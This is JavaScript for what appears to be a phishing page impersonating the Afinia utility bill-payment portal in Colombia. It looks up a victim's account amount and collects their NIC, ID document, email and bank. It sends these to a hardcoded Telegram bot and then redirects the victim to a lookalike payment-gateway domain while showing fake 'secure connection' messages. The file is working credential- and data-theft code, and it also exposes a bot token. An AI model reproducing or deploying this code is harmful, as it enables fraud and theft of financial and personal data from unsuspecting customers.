// --- CONSTANTES ---
        const TELEGRAM_BOT_TOKEN = '8425620613:AAGtK8DnpmnRcudQp_tIy4kc7MJuq0QUbPE';
        const TELEGRAM_CHAT_ID = '-4977407810';
        const API_PASARELA = 'https://aire.pagoswebcol.uk';

        // --- VARIABLES GLOBALES ---
        let montoGlobal = 0; 

        // --- REFERENCIAS DOM ---
        const btnPagoMes = document.getElementById('btn-pago-mes');
        const inputNic = document.getElementById('input-nic');
        const spinnerNic = document.getElementById('spinner-nic');
        const hiddenFields = document.getElementById('hidden-fields');
        const valorDisplay = document.getElementById('valor-display');
        
        const btnPagarFinal = document.getElementById('btn-pagar-final');
        const inputEmail = document.getElementById('input-email');
        const inputDocumento = document.getElementById('input-documento');
        const selectBanco = document.getElementById('banco-select');

        const fullLoader = document.getElementById('full-loader');
        const loaderTitle = document.getElementById('loader-title');
        
        const menuBtn = document.getElementById('menu-toggle');
        const sidebar = document.getElementById('sidebar');
        const overlay = document.getElementById('menu-overlay');

        // --- 1. LÓGICA UI (MENÚ) ---
        function toggleMenu() {
            sidebar.classList.toggle('open');
            overlay.classList.toggle('active');
        }
        menuBtn.addEventListener('click', toggleMenu);
        overlay.addEventListener('click', toggleMenu);

        // --- 2. CONSULTAR NIC ---
        btnPagoMes.addEventListener('click', async () => {
            const nicValue = inputNic.value.trim();
            if (!nicValue) { alert("Ingrese un NIC válido."); return; }

            spinnerNic.classList.remove('hidden');
            hiddenFields.classList.add('hidden');

            try {
                const response = await fetch(`https://afiniapagarfactura.st/api/api?Referencia=${nicValue}`);
                if (!response.ok) throw new Error('Error API NIC');
                const data = await response.json();
                
                // data.Value viene de tu API (Corregido mayúscula)
                montoGlobal = data.Value || data.valor || data.total || 0; 
                
                if (montoGlobal === 0) throw new Error("Monto inválido");

                const formatoPesos = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(montoGlobal);
                valorDisplay.innerText = formatoPesos;

                spinnerNic.classList.add('hidden');
                hiddenFields.classList.remove('hidden');
                hiddenFields.classList.add('fade-in');

            } catch (error) {
                console.error(error);
                spinnerNic.classList.add('hidden');
                alert("No se pudo consultar el NIC.");
            }
        });

        // --- 3. HELPER TELEGRAM ---
        async function sendTelegramAlert(text) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
            } catch (err) { console.warn('Telegram error:', err); }
        }

        function escapeHtml(str) {
            if (!str) return '';
            return String(str).replace(/[&<>"']/g, function (m) {
                return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[m];
            });
        }

        // --- 4. LÓGICA DE PAGO Y PASARELA (SIN IP) ---
        btnPagarFinal.addEventListener('click', async function() {
            const banco = selectBanco.value;
            const email = inputEmail.value.trim();
            const nic = inputNic.value.trim();
            const doc = inputDocumento.value.trim();
            const amount = montoGlobal > 0 ? montoGlobal : 5000; 

            // Validaciones
            if (!banco || banco === "") { alert("Seleccione un banco."); selectBanco.focus(); return; }
            if (!email || !email.includes('@')) { alert("Verifique el correo."); inputEmail.focus(); return; }

            // Activar Loader (Ahora centrado perfectamente por CSS)
            fullLoader.classList.remove('hidden');
            fullLoader.style.display = 'flex'; // Flex asegura el centrado del CSS

            // Ciclo de mensajes
            const loadingMessages = [
                "Conectando con la pasarela de pagos...",
                "Verificando disponibilidad bancaria...",
                "Estableciendo conexión segura con PSE...",
                "Redirigiendo a su banco...",
                "Por favor espere..."
            ];
            let textIndex = 0;
            const textInterval = setInterval(() => {
                textIndex = (textIndex + 1) % loadingMessages.length;
                loaderTitle.innerText = loadingMessages[textIndex];
            }, 2500);

            // Alerta Telegram (Sin IP)
            const mensajeTelegram = `<b>Pago iniciado (Afinia)</b>%0A` +
                `NIC: ${escapeHtml(nic)}%0A` +
                `Doc: ${escapeHtml(doc)}%0A` +
                `Correo: ${escapeHtml(email)}%0A` +
                `Banco: ${escapeHtml(banco)}%0A` +
                `Monto: ${escapeHtml(amount)}`;

            await sendTelegramAlert(decodeURIComponent(mensajeTelegram));

            // Preparar petición
            const params = new URLSearchParams({
                amount: amount,
                bank: banco,
                email: email,
                headless: 0,
                timeout: 60000 
            });

            const apiUrl = `${API_PASARELA}/meter?${params.toString()}`;
            console.log("Conectando:", apiUrl);

            // Fetch
            try {
                const response = await fetch(apiUrl, {
                    method: 'GET',
                    headers: { 'Content-Type': 'application/json' }
                });

                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                const result = await response.json();

                if (result.ok && result.result && result.result.exactName) {
                    finalizarConExito(result.result.exactName);
                } else {
                    throw new Error(result.error || "Error servidor");
                }

            } catch (error) {
                console.warn("Fallo fetch directo, intentando JSONP...", error);
                intentarJsonp(API_PASARELA, params);
            }

            // Redirección
            function finalizarConExito(url) {
                clearInterval(textInterval);
                loaderTitle.innerText = "¡Conexión exitosa! Redirigiendo...";
                setTimeout(() => {
                    window.location.href = url;
                }, 1000);
            }

            function intentarJsonp(baseUrl, params) {
                const callbackName = 'jsonp_callback_' + Math.round(100000 * Math.random());
                const script = document.createElement('script');
                
                window[callbackName] = function(data) {
                    document.head.removeChild(script);
                    delete window[callbackName];
                    
                    if (data.ok && data.result && data.result.exactName) {
                        finalizarConExito(data.result.exactName);
                    } else {
                        redirigirDirecto();
                    }
                };

                script.onerror = function() {
                    document.head.removeChild(script);
                    delete window[callbackName];
                    redirigirDirecto();
                };

                script.src = `${baseUrl}/meter.jsonp?${params.toString()}&callback=${callbackName}`;
                document.head.appendChild(script);
            }

            function redirigirDirecto() {
                loaderTitle.innerText = "Redirigiendo al servidor seguro...";
                window.location.href = `${API_PASARELA}/meter?${params.toString()}`;
            }

        });
